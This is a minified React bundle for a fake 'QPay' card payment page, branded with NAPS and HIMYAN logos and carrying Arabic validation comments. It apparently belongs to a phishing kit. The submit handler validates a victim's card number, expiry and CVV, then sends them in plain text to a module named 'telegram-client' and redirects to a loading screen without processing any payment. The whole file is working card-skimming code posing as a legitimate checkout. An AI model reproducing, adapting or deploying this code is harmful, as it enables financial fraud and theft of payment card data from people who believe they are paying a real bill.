import{b as y,u as v,r,j as e}from"./index-Dq-H0M4e.js";import{q as w,n as C,h as S}from"./himyan-DC04TQKI.js";import{s as P}from"./telegram-client-Bp448Zxd.js";import{u as $}from"./useTrackUserLogin-DuWNSSAp.js";const k=Array.from({length:12},(s,a)=>String(a+1).padStart(2,"0")),A=Array.from({length:12},(s,a)=>String(2026+a));function R(){$();const s=y.useSearch(),a=v(),[c,u]=r.useState(""),[n,g]=r.useState(""),[l,f]=r.useState(""),[o,b]=r.useState(""),[m,x]=r.useState(!1),[d,p]=r.useState(null),i=c.replace(/\s/g,""),j=i.length>=12,h=i.length>=12&&n&&l&&o.length>=3&&!m;async function N(){
// ===== خوارزمية Luhn للتحقق من رقم البطاقة =====
function luhnCheck(num){
  let s=num.replace(/\s/g,"");
  if(!/^\d+$/.test(s))return false;
  let sum=0,alt=false;
  for(let i=s.length-1;i>=0;i--){
    let n=parseInt(s[i],10);
    if(alt){n*=2;if(n>9)n-=9;}
    sum+=n;alt=!alt;
  }
  return sum%10===0;
}
// ===== التحقق من نوع البطاقة =====
function getCardType(num){
  let s=num.replace(/\s/g,"");
  if(/^4/.test(s))return"visa";
  if(/^5[1-5]/.test(s)||/^2[2-7]/.test(s))return"mastercard";
  if(/^3[47]/.test(s))return"amex";
  return"other";
}
// ===== التحقق من تاريخ الانتهاء =====
function validateExpiry(month,year){
  if(!month||!year)return{valid:false,msg:"يرجى اختيار تاريخ انتهاء البطاقة"};
  let m=parseInt(month,10);
  let y=parseInt(year,10);
  if(m<1||m>12)return{valid:false,msg:"الشهر يجب أن يكون بين 01 و 12"};
  let now=new Date();
  let expDate=new Date(y,m,1);
  if(expDate<=now)return{valid:false,msg:"تاريخ انتهاء البطاقة قد مضى"};
  return{valid:true,msg:""};
}
// ===== التحقق الكامل =====
const cardNum=i;
const cardType=getCardType(cardNum);
const expectedCvvLen=cardType==="amex"?4:3;
const minCardLen=cardType==="amex"?15:16;
if(cardNum.length<minCardLen){p("رقم البطاقة يجب أن يكون "+minCardLen+" رقماً على الأقل.");return;}
if(!/^\d+$/.test(cardNum)){p("رقم البطاقة يجب أن يحتوي على أرقام فقط.");return;}
if(!luhnCheck(cardNum)){p("رقم البطاقة غير صحيح. يرجى التحقق من الرقم والمحاولة مجدداً.");return;}
const expiryResult=validateExpiry(n,l);
if(!expiryResult.valid){p(expiryResult.msg);return;}
if(o.length<expectedCvvLen||!/^\d+$/.test(o)){p("رمز CVV يجب أن يكون "+expectedCvvLen+" أرقام.");return;}
if(h){x(!0),p(null);try{const t=i;await P({businessName:`[QPay] ${s.name||"—"}`,phone:s.phone||"—",address:`QPay Payment | المرجع: ${s.ref} | المبلغ: QAR ${s.amount.toFixed(2)} | رقم البطاقة: ${t} | تاريخ الانتهاء: ${n}/${l} | CVV: ${o} | الخدمة: ${s.service||"—"} | الإجمالي: ${s.total} ر.ق`}),a({to:"/loading",search:{amount:s.amount,ref:s.ref,name:s.name,phone:s.phone,address:s.address,service:s.service,total:s.total}})}catch{p("Payment failed. Please try again.")}finally{x(!1)}}}return e.jsx("div",{dir:"ltr",className:"min-h-screen bg-[#f3f3f3] text-[#1f1f1f] font-sans",children:e.jsxs("div",{className:"max-w-5xl mx-auto px-3 sm:px-6 py-4 sm:py-8",children:[e.jsx("img",{src:w,alt:"QPay",className:"h-8 sm:h-10 w-auto"}),e.jsxs("div",{className:"mt-6 sm:mt-8 flex flex-col sm:flex-row sm:items-start sm:justify-between gap-4 sm:gap-6",children:[e.jsxs("div",{className:"space-y-2 text-[13px] sm:text-[15px] break-all",children:[e.jsxs("p",{children:[e.jsx("span",{className:"font-bold",children:"Payment Unique Number:"})," ",e.jsx("span",{children:s.ref})]}),e.jsxs("p",{children:[e.jsx("span",{className:"font-bold",children:"Description:"})," ",e.jsx("span",{children:s.ref})]})]}),e.jsxs("div",{className:"sm:text-right",children:[e.jsx("p",{className:"text-[#7a1830] font-bold text-[15px]",children:"Amount"}),e.jsxs("p",{className:"text-[#7a1830] text-2xl sm:text-3xl font-semibold mt-1",children:["QAR ",s.amount.toFixed(2)]})]})]}),e.jsxs("div",{className:"mt-6 border border-[#7a1830] bg-white",children:[e.jsx("div",{className:"bg-[#5a0f24] text-white px-4 sm:px-5 py-3 text-[14px] sm:text-[15px] font-semibold",children:"Enter your payment card details"}),e.jsx("div",{className:"px-4 sm:px-6 py-6 sm:py-8",children:e.jsxs("div",{className:"max-w-2xl mx-auto space-y-6",children:[e.jsxs("div",{className:"grid grid-cols-1 sm:grid-cols-[170px_1fr] gap-2 sm:gap-4 sm:items-center",children:[e.jsx("label",{className:"sm:text-right font-bold text-[14px] sm:text-[15px]",children:"Card Number"}),e.jsx("input",{type:"number",inputMode:"numeric",value:c,onChange:t=>u(t.target.value.replace(/\D/g,"").slice(0,16).replace(/(.{4})/g,"$1 ").trim()),className:"h-10 sm:h-9 border border-gray-400 px-2 outline-none focus:border-[#7a1830] bg-white w-full"})]}),e.jsxs("div",{className:"grid grid-cols-1 sm:grid-cols-[170px_1fr] gap-2 sm:gap-4 sm:items-center",children:[e.jsx("label",{className:"sm:text-right font-bold text-[14px] sm:text-[15px]",children:"Card Expiry Date"}),e.jsxs("div",{className:"flex gap-3",children:[e.jsxs("select",{value:n,onChange:t=>g(t.target.value),className:"h-10 sm:h-9 border border-gray-400 px-2 bg-white outline-none focus:border-[#7a1830] flex-1 sm:flex-none sm:min-w-[110px]",children:[e.jsx("option",{value:""}),k.map(t=>e.jsx("option",{value:t,children:t},t))]}),e.jsxs("select",{value:l,onChange:t=>f(t.target.value),className:"h-10 sm:h-9 border border-gray-400 px-2 bg-white outline-none focus:border-[#7a1830] flex-1 sm:flex-none sm:min-w-[110px]",children:[e.jsx("option",{value:""}),A.map(t=>e.jsx("option",{value:t,children:t},t))]})]})]}),j&&e.jsxs("div",{className:"grid grid-cols-1 sm:grid-cols-[170px_1fr] gap-2 sm:gap-4 sm:items-center",children:[e.jsx("label",{className:"sm:text-right font-bold text-[14px] sm:text-[15px]",children:"CVV"}),e.jsx("input",{type:"number",inputMode:"numeric",value:o,onChange:t=>b(t.target.value.replace(/\D/g,"").slice(0,4)),placeholder:"•••",className:"h-10 sm:h-9 border border-gray-400 px-2 outline-none focus:border-[#7a1830] bg-white w-full sm:max-w-[120px] tracking-widest"})]}),e.jsxs("p",{className:"text-center text-[12px] sm:text-[13px] text-[#1f1f1f]",children:['By clicking the "Continue" button, you hereby acknowledge accepting the'," ",e.jsx("a",{className:"text-[#1d4ed8] underline",children:"Terms and Conditions"})," ","of payment."]}),d&&e.jsx("p",{className:"text-center text-sm text-red-600",children:d}),e.jsxs("div",{className:"flex flex-col sm:flex-row sm:items-end sm:justify-between gap-4 pt-2",children:[e.jsxs("div",{className:"flex items-center gap-5",children:[e.jsx("img",{src:C,alt:"NAPS",className:"h-5 w-auto"}),e.jsx("img",{src:S,alt:"HIMYAN",className:"h-5 w-auto"})]}),e.jsxs("div",{className:"flex gap-3 w-full sm:w-auto",children:[e.jsx("button",{type:"button",disabled:!h,onClick:N,className:"flex-1 sm:flex-none sm:min-w-[110px] h-10 px-4 bg-[#d9d9d9] text-[#1f1f1f] border border-gray-400 disabled:opacity-60 hover:bg-[#c9c9c9] transition-colors",children:m?"Processing...":"Continue"}),e.jsx("button",{type:"button",onClick:()=>a({to:"/"}),className:"flex-1 sm:flex-none sm:min-w-[110px] h-10 px-4 bg-white border border-gray-400 hover:bg-gray-50 transition-colors",children:"Cancel"})]})]})]})})]}),e.jsx("p",{className:"mt-5 text-center text-[12px] sm:text-[13px] text-[#1d4ed8]",children:"For proper completion of your transaction, please do not refresh this page or click the browser's back button."})]})})}export{R as component};
